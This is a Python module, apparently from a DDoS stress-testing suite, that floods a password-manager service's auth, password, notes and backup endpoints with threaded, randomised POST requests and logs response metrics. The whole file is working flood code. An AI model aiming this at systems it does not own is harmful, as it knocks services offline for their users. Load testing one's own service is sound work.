import requests
import threading
import time
import random
import json
import os
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# Инициализация colorama для цветного вывода
init(autoreset=True)

class PostFloodAttack:
    """Класс для выполнения POST Flood атаки"""
    
    def __init__(self, target_url: str, threads: int = 10, requests_per_thread: int = 100):
        self.target_url = target_url
        self.threads = threads
        self.requests_per_thread = requests_per_thread
        self.running = False
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # POST эндпоинты для атаки
        self.post_endpoints = [
            "/auth/register",
            "/auth/login", 
            "/auth/sync-setup",
            "/auth/verify-otp",
            "/auth/initiate-recovery",
            "/auth/cloud-login",
            "/auth/create-transfer-token",
            "/auth/use-transfer-token",
            "/auth/test-email",
            "/auth/verify-cloud-otp",
            "/api/passwords",
            "/api/notes",
            "/api/backup/import"
        ]
    
    def get_request_data(self, endpoint: str):
        """Получает подходящие данные для POST запроса к эндпоинту"""
        return test_data_generator.get_random_endpoint_data(endpoint)
    
    def attack_thread(self, thread_id: int):
        """Функция для выполнения атаки в отдельном потоке"""
        print(f"{Fore.YELLOW}🚀 Поток {thread_id} запущен")
        
        for i in range(self.requests_per_thread):
            if not self.running:
                break
                
            try:
                # Выбираем случайный POST эндпоинт
                endpoint = random.choice(self.post_endpoints)
                url = self.target_url + endpoint
                
                # Генерируем случайные заголовки
                headers = test_data_generator.get_random_headers()
                headers["Content-Type"] = "application/json"
                
                # Получаем подходящие данные для эндпоинта
                post_data = self.get_request_data(endpoint)
                
                # Добавляем случайные дополнительные поля для усложнения обработки
                if random.choice([True, False]):
                    post_data.update({
                        "timestamp": str(int(time.time())),
                        "clientId": f"client_{random.randint(1000, 9999)}",
                        "requestId": f"req_{random.randint(10000, 99999)}",
                        "metadata": {
                            "version": "1.0",
                            "source": "ddos_test",
                            "extra_field": "x" * random.randint(100, 1000)  # Добавляем объем данных
                        }
                    })
                
                start_time = time.time()
                
                # Выполняем POST запрос
                response = requests.post(
                    url,
                    headers=headers,
                    json=post_data,
                    timeout=10  # Больший timeout для POST запросов
                )
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Собираем метрики
                metrics_collector.add_metric(
                    response_time=response_time,
                    status_code=response.status_code,
                    size=len(response.content),
                    attack_type="POST_FLOOD",
                    endpoint=endpoint
                )
                
                self.total_requests += 1
                if response.status_code < 400:
                    self.successful_requests += 1
                    print(f"{Fore.GREEN}✅ [{thread_id}] {response.status_code} {endpoint} ({response_time:.3f}s) - {len(json.dumps(post_data))} bytes")
                else:
                    self.failed_requests += 1
                    print(f"{Fore.RED}❌ [{thread_id}] {response.status_code} {endpoint} ({response_time:.3f}s)")
                
                # Небольшая случайная задержка между запросами
                time.sleep(random.uniform(0.01, 0.2))
                
            except requests.exceptions.Timeout:
                metrics_collector.add_metric(
                    response_time=10.0,
                    status_code=0,
                    size=0,
                    attack_type="POST_FLOOD",
                    endpoint=endpoint,
                    error="Timeout"
                )
                self.failed_requests += 1
                print(f"{Fore.YELLOW}⏱️  [{thread_id}] Timeout {endpoint}")
                
            except requests.exceptions.ConnectionError:
                metrics_collector.add_metric(
                    response_time=0,
                    status_code=0,
                    size=0,
                    attack_type="POST_FLOOD",
                    endpoint=endpoint,
                    error="Connection Error"
                )
                self.failed_requests += 1
                print(f"{Fore.RED}🔌 [{thread_id}] Connection Error {endpoint}")
                
            except Exception as e:
                metrics_collector.add_metric(
                    response_time=0,
                    status_code=0,
                    size=0,
                    attack_type="POST_FLOOD",
                    endpoint=endpoint,
                    error=str(e)
                )
                self.failed_requests += 1
                print(f"{Fore.RED}💥 [{thread_id}] Error: {str(e)}")
        
        print(f"{Fore.BLUE}🏁 Поток {thread_id} завершен")
    
    def run(self):
        """Запуск POST Flood атаки"""
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.MAGENTA}📮 ЗАПУСК POST FLOOD АТАКИ")
        print(f"{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.WHITE}Цель: {self.target_url}")
        print(f"{Fore.WHITE}Потоков: {self.threads}")
        print(f"{Fore.WHITE}Запросов на поток: {self.requests_per_thread}")
        print(f"{Fore.WHITE}Общее количество запросов: {self.threads * self.requests_per_thread}")
        print(f"{Fore.WHITE}POST эндпоинты: {', '.join(self.post_endpoints[:3])}...")
        print(f"{Fore.MAGENTA}{'='*60}")
        
        # Очищаем предыдущие метрики
        metrics_collector.clear()
        
        self.running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Создаем и запускаем потоки
        threads = []
        start_time = time.time()
        
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            # Ждем завершения всех потоков
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⏹️  Атака прервана пользователем")
            self.running = False
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Выводим итоговую статистику
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.MAGENTA}📊 РЕЗУЛЬТАТЫ POST FLOOD АТАКИ")
        print(f"{Fore.MAGENTA}{'='*60}")
        print(f"{Fore.WHITE}Время выполнения: {duration:.2f} секунд")
        print(f"{Fore.WHITE}Общих запросов: {self.total_requests}")
        print(f"{Fore.GREEN}Успешных: {self.successful_requests}")
        print(f"{Fore.RED}Неудачных: {self.failed_requests}")
        
        if duration > 0:
            rps = self.total_requests / duration
            print(f"{Fore.YELLOW}Запросов в секунду: {rps:.2f}")
        
        print(f"{Fore.MAGENTA}{'='*60}")
        
        # Сохраняем метрики
        timestamp = int(time.time())
        csv_filename = f"metrics/post_flood_{timestamp}.csv"
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, threads: int = 10, requests_per_thread: int = 100):
    """Функция для запуска POST Flood атаки (совместимость с меню)"""
    attack = PostFloodAttack(target_url, threads, requests_per_thread)
    return attack.run() 